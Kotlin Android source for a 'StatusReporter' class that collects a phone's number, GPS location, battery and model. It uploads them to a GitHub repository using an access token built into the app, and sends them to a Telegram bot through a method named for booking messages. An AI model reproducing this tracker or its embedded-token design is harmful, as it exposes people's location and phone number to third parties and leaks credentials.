package com.example.telegramservice

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.BatteryManager
import android.os.Build
import android.provider.Settings
import android.telephony.TelephonyManager
import androidx.core.content.ContextCompat
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.google.android.gms.tasks.CancellationTokenSource
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit
import android.util.Base64
import kotlin.coroutines.resume

/**
 * GitHub ko Cloud ke taur par use karna + Location + Battery + Mobile Number
 * Android App -> GitHub Repo (Suto) -> Telegram WebApp Console
 */

class StatusReporter(private val context: Context) {

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .build()

    // GitHub Config
    private val GITHUB_USER = "dthakur-dt"
    private val GITHUB_REPO = "Suto"
    private val GITHUB_BRANCH = "main"

    private fun getGitHubPat(): String {
        return try {
            BuildConfig.GITHUB_PAT
        } catch (e: Exception) {
            ""
        }
    }

    fun getDeviceId(): String {
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        return "DEVICE_${androidId.take(8).uppercase()}"
    }

    fun getDeviceName(): String {
        return "${Build.MANUFACTURER} ${Build.MODEL}"
    }

    fun getBatteryLevel(): Int {
        return try {
            val bm = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
            bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        } catch (e: Exception) {
            -1
        }
    }

    fun getBatteryStatusText(): String {
        val level = getBatteryLevel()
        return when {
            level >= 80 -> "🔋 $level% (Full)"
            level >= 50 -> "🔋 $level% (Good)"
            level >= 20 -> "🪫 $level% (Low)"
            level >= 0 -> "🔴 $level% (Critical)"
            else -> "🔋 Unknown"
        }
    }

    // ============ MOBILE NUMBER ============
    fun getMobileNumber(): String {
        return try {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED) {
                return "Permission needed - App settings me allow karo"
            }
            
            val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            
            // Try multiple methods to get number
            var number = ""
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                try {
                    number = telephonyManager.line1Number ?: ""
                } catch (e: Exception) {}
            }
            
            if (number.isEmpty()) {
                try {
                    number = telephonyManager.line1Number ?: ""
                } catch (e: Exception) {}
            }
            
            // If still empty, try subscription
            if (number.isEmpty() && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                try {
                    val subscriptionManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? android.telephony.SubscriptionManager
                    if (subscriptionManager != null && ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                        val info = subscriptionManager.activeSubscriptionInfoList?.firstOrNull()
                        number = info?.number ?: ""
                    }
                } catch (e: Exception) {}
            }

            when {
                number.isEmpty() -> "Not available (SIM me number save nahi hai - Phone settings me check karo)"
                else -> number
            }
        } catch (e: SecurityException) {
            "Permission denied - READ_PHONE_STATE allow karo"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    // ============ LOCATION ============
    data class LocationData(
        val latitude: Double,
        val longitude: Double,
        val accuracy: Float,
        val address: String = ""
    )

    suspend fun getLocation(): LocationData? = withContext(Dispatchers.IO) {
        try {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                return@withContext null
            }

            val fusedLocationClient = LocationServices.getFusedLocationProviderClient(context)
            
            return@withContext suspendCancellableCoroutine { cont ->
                try {
                    fusedLocationClient.getCurrentLocation(Priority.PRIORITY_BALANCED_POWER_ACCURACY, CancellationTokenSource().token)
                        .addOnSuccessListener { location ->
                            if (location != null) {
                                val loc = LocationData(
                                    latitude = location.latitude,
                                    longitude = location.longitude,
                                    accuracy = location.accuracy,
                                    address = "${location.latitude}, ${location.longitude}"
                                )
                                cont.resume(loc)
                            } else {
                                // Try last location
                                fusedLocationClient.lastLocation.addOnSuccessListener { lastLoc ->
                                    if (lastLoc != null) {
                                        cont.resume(
                                            LocationData(
                                                latitude = lastLoc.latitude,
                                                longitude = lastLoc.longitude,
                                                accuracy = lastLoc.accuracy
                                            )
                                        )
                                    } else {
                                        cont.resume(null)
                                    }
                                }.addOnFailureListener {
                                    cont.resume(null)
                                }
                            }
                        }
                        .addOnFailureListener {
                            cont.resume(null)
                        }
                } catch (e: Exception) {
                    cont.resume(null)
                }
            }
        } catch (e: Exception) {
            null
        }
    }

    fun getLocationString(loc: LocationData?): String {
        return if (loc != null) {
            "📍 Lat: ${loc.latitude}, Lon: ${loc.longitude}\n🗺️ Map: https://maps.google.com/?q=${loc.latitude},${loc.longitude}\n🎯 Accuracy: ${loc.accuracy.toInt()}m"
        } else {
            "📍 Location: Permission needed ya GPS off hai\nSettings me Location allow karo"
        }
    }

    // ============ FULL STATUS JSON ============
    suspend fun createStatusJson(customOutput: String, location: LocationData? = null, mobileNumber: String = ""): JSONObject {
        val now = Date()
        val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        
        val actualMobile = if (mobileNumber.isNotEmpty()) mobileNumber else getMobileNumber()
        val actualLocation = location ?: getLocation()
        
        return JSONObject().apply {
            put("deviceId", getDeviceId())
            put("name", getDeviceName())
            put("model", Build.MODEL)
            put("manufacturer", Build.MANUFACTURER)
            put("androidVersion", Build.VERSION.RELEASE)
            put("sdkInt", Build.VERSION.SDK_INT)
            put("appVersion", BuildConfig.VERSION_NAME)
            put("lastSeen", SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US).format(now))
            put("lastSeenReadable", sdf.format(now))
            put("battery", getBatteryLevel())
            put("batteryText", getBatteryStatusText())
            put("mobileNumber", actualMobile)
            put("status", "online")
            
            // Location
            if (actualLocation != null) {
                put("latitude", actualLocation.latitude)
                put("longitude", actualLocation.longitude)
                put("accuracy", actualLocation.accuracy)
                put("locationString", "${actualLocation.latitude},${actualLocation.longitude}")
                put("mapsUrl", "https://maps.google.com/?q=${actualLocation.latitude},${actualLocation.longitude}")
            } else {
                put("latitude", 0.0)
                put("longitude", 0.0)
                put("locationString", "Not available")
                put("mapsUrl", "")
            }
            
            // Full output jo WebApp Console me dikhega
            put("output", customOutput.ifEmpty { 
                buildString {
                    appendLine("✅ Suto Status Report")
                    appendLine("━━━━━━━━━━━━━━━━━━━")
                    appendLine("📱 Device: ${getDeviceName()}")
                    appendLine("🆔 ID: ${getDeviceId()}")
                    appendLine("🤖 Android: ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})")
                    appendLine("📦 App: v${BuildConfig.VERSION_NAME}")
                    appendLine("")
                    appendLine(getBatteryStatusText())
                    appendLine("")
                    appendLine("📞 Mobile: $actualMobile")
                    appendLine("")
                    appendLine(getLocationString(actualLocation))
                    appendLine("")
                    appendLine("⏰ Time: ${sdf.format(now)}")
                    appendLine("☁️ Cloud: GitHub $GITHUB_USER/$GITHUB_REPO")
                    appendLine("🤖 Bot: @T1311bot")
                    appendLine("💻 Console: dthakur-dt.github.io/Suto/")
                }
            })
        }
    }

    // ============ SEND TO GITHUB CLOUD ============
    suspend fun sendStatusToGitHub(customOutput: String = ""): Result = withContext(Dispatchers.IO) {
        val pat = getGitHubPat()
        if (pat.isEmpty() || pat.contains("YOUR_") || pat.length < 10) {
            // Still send to Telegram even if GitHub PAT not set
            return@withContext Result(false, "GitHub PAT set nahi hai - local.properties me github.pat daalo. Testing ke liye chalega, lekin cloud save nahi hoga.")
        }

        try {
            val deviceId = getDeviceId()
            val location = getLocation()
            val mobile = getMobileNumber()
            val statusJson = createStatusJson(customOutput, location, mobile)
            val filePath = "data/devices/$deviceId.json"
            val content = statusJson.toString(2)
            val contentBase64 = Base64.encodeToString(content.toByteArray(), Base64.NO_WRAP)

            var sha: String? = null
            val getUrl = "https://api.github.com/repos/$GITHUB_USER/$GITHUB_REPO/contents/$filePath"
            val getRequest = Request.Builder()
                .url(getUrl)
                .header("Authorization", "token $pat")
                .header("Accept", "application/vnd.github.v3+json")
                .get()
                .build()

            val getResponse = client.newCall(getRequest).execute()
            if (getResponse.isSuccessful) {
                val body = getResponse.body?.string() ?: ""
                val json = JSONObject(body)
                sha = json.optString("sha", null)
            }

            val putBodyJson = JSONObject().apply {
                put("message", "📱 ${getDeviceName()} - Batt:${getBatteryLevel()}% - Loc:${location?.latitude ?: 0},${location?.longitude ?: 0} - ${Date()}")
                put("content", contentBase64)
                put("branch", GITHUB_BRANCH)
                if (sha != null) put("sha", sha)
            }

            val putRequest = Request.Builder()
                .url(getUrl)
                .header("Authorization", "token $pat")
                .header("Accept", "application/vnd.github.v3+json")
                .put(putBodyJson.toString().toRequestBody("application/json".toMediaType()))
                .build()

            val putResponse = client.newCall(putRequest).execute()
            val respBody = putResponse.body?.string() ?: ""

            if (putResponse.isSuccessful) {
                updateDevicesIndex(deviceId)
                Result(true, "☁️ GitHub Cloud ✅\n${getBatteryStatusText()}\n📞 $mobile\n${getLocationString(location)}\n💻 Console: dthakur-dt.github.io/Suto/")
            } else {
                Result(false, "GitHub Error ${putResponse.code}: $respBody")
            }

        } catch (e: Exception) {
            Result(false, "Exception: ${e.message}")
        }
    }

    private suspend fun updateDevicesIndex(deviceId: String) {
        try {
            val pat = getGitHubPat()
            val indexPath = "data/devices/index.json"
            val getUrl = "https://api.github.com/repos/$GITHUB_USER/$GITHUB_REPO/contents/$indexPath"
            
            var existingDevices = mutableSetOf<String>()
            var sha: String? = null

            val getRequest = Request.Builder()
                .url(getUrl)
                .header("Authorization", "token $pat")
                .get()
                .build()
            val getResp = client.newCall(getRequest).execute()
            if (getResp.isSuccessful) {
                val body = getResp.body?.string() ?: ""
                val json = JSONObject(body)
                sha = json.optString("sha", null)
                val contentB64 = json.optString("content", "")
                if (contentB64.isNotEmpty()) {
                    val contentStr = String(Base64.decode(contentB64, Base64.DEFAULT))
                    val contentJson = JSONObject(contentStr)
                    val arr = contentJson.optJSONArray("devices")
                    if (arr != null) {
                        for (i in 0 until arr.length()) {
                            existingDevices.add(arr.getString(i))
                        }
                    }
                }
            }

            existingDevices.add(deviceId)

            val newContent = JSONObject().apply {
                put("devices", org.json.JSONArray(existingDevices.toList()))
                put("lastUpdated", Date().toString())
                put("total", existingDevices.size)
            }

            val newContentB64 = Base64.encodeToString(newContent.toString(2).toByteArray(), Base64.NO_WRAP)
            val putBody = JSONObject().apply {
                put("message", "📋 Update index - $deviceId - Batt:${getBatteryLevel()}%")
                put("content", newContentB64)
                put("branch", GITHUB_BRANCH)
                if (sha != null) put("sha", sha)
            }

            val putRequest = Request.Builder()
                .url(getUrl)
                .header("Authorization", "token $pat")
                .put(putBody.toString().toRequestBody("application/json".toMediaType()))
                .build()
            client.newCall(putRequest).execute()

        } catch (e: Exception) {}
    }

    suspend fun sendStatusToTelegram(customOutput: String): TelegramBotHelper.Result {
        val helper = TelegramBotHelper()
        val deviceId = getDeviceId()
        val location = getLocation()
        val mobile = getMobileNumber()
        val batteryText = getBatteryStatusText()
        
        val telegramMessage = """
            📱 *Device Status - GitHub Cloud*
            
            🆔 Device: $deviceId
            📱 Model: ${getDeviceName()}
            $batteryText
            📞 Mobile: $mobile
            ${getLocationString(location)}
            ⏰ ${SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())}
            
            📝 *Output:*
            ```
            ${customOutput.take(500)}
            ```
            
            ☁️ GitHub: dthakur-dt/Suto/data/devices/$deviceId.json
            💻 Console: dthakur-dt.github.io/Suto/
            
            🗺️ Maps: ${if (location != null) "https://maps.google.com/?q=${location.latitude},${location.longitude}" else "Location not available"}
        """.trimIndent()

        return helper.sendBookingMessage(
            name = "STATUS_$deviceId",
            phone = mobile,
            service = telegramMessage
        )
    }

    data class Result(val ok: Boolean, val message: String)
}
